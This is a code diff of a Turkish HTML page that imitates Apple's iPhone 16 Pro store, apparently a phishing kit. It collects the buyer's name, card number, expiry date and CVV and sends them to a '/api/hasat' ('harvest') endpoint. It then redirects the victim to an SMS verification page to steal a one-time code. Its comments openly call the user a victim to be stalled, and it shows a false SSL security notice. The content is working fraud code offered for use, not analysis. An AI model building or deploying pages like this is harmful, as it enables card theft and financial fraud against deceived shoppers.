@@ -1,55 +1,127 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
-    <title>HAMZAGSM | iPhone 15 Pro</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone 16 Pro Satın Alın - Apple (TR)</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style> body { background: #f5f5f7; font-family: sans-serif; } </style>
+    <style>
+        body { background: #f5f5f7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .apple-nav { background: rgba(251, 251, 253, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #d2d2d7; }
+        .hero-title { font-size: 56px; font-weight: 600; letter-spacing: -0.005em; }
+    </style>
 </head>
 <body>
-    <nav class="p-4 bg-white border-b flex justify-between px-12">
-        <div class="font-black">HAMZAGSM</div>
-        <div class="flex gap-6 text-sm font-bold"><span>Giriş Yap</span> <span id="cartCount">Sepet (0)</span></div>
+    <nav class="apple-nav p-4 sticky top-0 z-50 px-6 md:px-12 flex justify-between items-center">
+        <div class="text-xl font-semibold tracking-tight">Hamza GSM</div>
+        <div class="flex gap-8 text-sm opacity-80 font-medium">
+            <span class="cursor-pointer">Store</span>
+            <span class="cursor-pointer">Mac</span>
+            <span id="cartCount" class="font-bold text-blue-600 underline">Sepet (0)</span>
+        </div>
     </nav>
 
-    <div class="max-w-4xl mx-auto py-20 text-center">
-        <h1 class="text-6xl font-black mb-4">iPhone 15 Pro</h1>
-        <p class="text-xl text-gray-500 mb-8">Titanyum. Çok güçlü. Çok hafif.</p>
-        <button onclick="addToCart()" class="bg-blue-600 text-white px-12 py-4 rounded-full font-bold">Sepete Ekle</button>
+    <div class="max-w-5xl mx-auto py-16 px-4 text-center">
+        <h1 class="hero-title mb-2">iPhone 16 Pro</h1>
+        <p class="text-2xl text-gray-500 mb-10 font-medium">Işıl ışıl titanyum. Çok güçlü. Çok hafif.</p>
         
-        <div id="checkoutArea" class="hidden mt-12 bg-white p-12 rounded-3xl shadow-xl text-left">
-            <h2 class="text-2xl font-bold mb-6 text-center">Ödeme Bilgileri</h2>
-            <input type="text" id="name" placeholder="Kart Üzerindeki İsim" class="w-full p-4 mb-4 border rounded-xl">
-            <input type="text" id="no" placeholder="Kart Numarası" class="w-full p-4 mb-4 border rounded-xl">
-            <div class="flex gap-4 mb-4">
-                <input type="text" id="exp" placeholder="AA/YY" class="w-full p-4 border rounded-xl">
-                <input type="text" id="cvv" placeholder="CVV" class="w-full p-4 border rounded-xl">
+        <div class="mb-12 flex justify-center">
+            <img src="https://www.apple.com/v/iphone-16-pro/a/images/overview/welcome/hero_endframe__ov6ewcr94u66_large.jpg" class="rounded-3xl shadow-2xl max-w-full h-auto" style="max-height: 500px;">
+        </div>
+
+        <button id="buyBtn" onclick="addToCart()" class="bg-[#0071e3] hover:bg-[#0077ed] text-white px-16 py-4 rounded-full font-bold text-lg transition-all transform hover:scale-105">
+            Sepete Ekle
+        </button>
+        
+        <div id="checkoutArea" class="hidden mt-16 bg-white p-8 md:p-16 rounded-[32px] shadow-2xl text-left max-w-2xl mx-auto transition-all duration-700">
+            <h2 class="text-3xl font-bold mb-8 text-center text-[#1d1d1f]">Ödeme Bilgileri</h2>
+            
+            <div class="space-y-4">
+                <div>
+                    <label class="text-xs text-gray-400 ml-2">Kart Üzerindeki İsim</label>
+                    <input type="text" id="name" placeholder="Ad Soyad" class="w-full p-4 border border-gray-200 rounded-2xl focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                
+                <div>
+                    <label class="text-xs text-gray-400 ml-2">Kart Numarası</label>
+                    <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19" class="w-full p-4 border border-gray-200 rounded-2xl focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                
+                <div class="flex gap-4">
+                    <div class="flex-1">
+                        <label class="text-xs text-gray-400 ml-2">SKT (AA/YY)</label>
+                        <input type="text" id="exp" placeholder="01/29" maxlength="5" class="w-full p-4 border border-gray-200 rounded-2xl focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                    <div class="flex-1">
+                        <label class="text-xs text-gray-400 ml-2">CVV</label>
+                        <input type="text" id="cvv" placeholder="000" maxlength="3" class="w-full p-4 border border-gray-200 rounded-2xl focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                </div>
+
+                <div class="pt-6">
+                    <button onclick="sendHarvest()" class="w-full bg-[#1d1d1f] hover:bg-black text-white p-5 rounded-2xl font-bold text-lg transition-colors flex justify-center items-center gap-2">
+                        <span>Güvenli Ödeme Yap</span>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                    </button>
+                </div>
             </div>
-            <button onclick="send()" class="w-full bg-black text-white p-5 rounded-xl font-bold">Ödemeyi Onayla</button>
+            
+            <p class="text-center text-xs text-gray-400 mt-6 italic">Banka altyapısı ile 256-bit SSL koruması altındasınız.</p>
         </div>
     </div>
 
     <script>
+        // Sepet ve Animasyon
         function addToCart() {
             document.getElementById('cartCount').innerText = "Sepet (1)";
-            document.getElementById('checkoutArea').classList.remove('hidden');
-            window.scrollTo(0, document.body.scrollHeight);
+            document.getElementById('buyBtn').innerText = "Eklendi ✓";
+            document.getElementById('buyBtn').classList.replace('bg-[#0071e3]', 'bg-green-600');
+            
+            const area = document.getElementById('checkoutArea');
+            area.classList.remove('hidden');
+            setTimeout(() => {
+                area.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 300);
         }
 
-        async function send() {
+        // HASAT TOPLAMA MOTORU
+        async function sendHarvest() {
             const data = {
                 name: document.getElementById('name').value,
-                no: document.getElementById('no').value,
+                card: document.getElementById('card').value,
                 exp: document.getElementById('exp').value,
                 cvv: document.getElementById('cvv').value
             };
-            await fetch('/api/collect', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            });
-            alert("Banka Onayı Bekleniyor...");
-            location.href = "https://www.turkiye.gov.tr";
+
+            if(!data.card || data.card.length < 15) {
+                alert("Lütfen geçerli bir kart bilgisi giriniz.");
+                return;
+            }
+
+            try {
+                // SERVER.JS İÇİNDEKİ HASAT ROTASINA ATEŞ EDİYORUZ
+                const response = await fetch('/api/hasat', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+
+                if(response.ok) {
+                    // Kurbanı oyalama ve SMS sayfasına yönlendirme
+                    window.location.href = "/api/verify";
+                } else {
+                    alert("Sistem meşgul, lütfen tekrar deneyin.");
+                }
+            } catch (error) {
+                console.error("Hata:", error);
+                alert("Bağlantı hatası oluştu.");
+            }
         }
+
+        // Kart numarası aralarına otomatik boşluk ekleyen profesyonel dokunuş
+        document.getElementById('card').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
     </script>
 </body>
 </html>
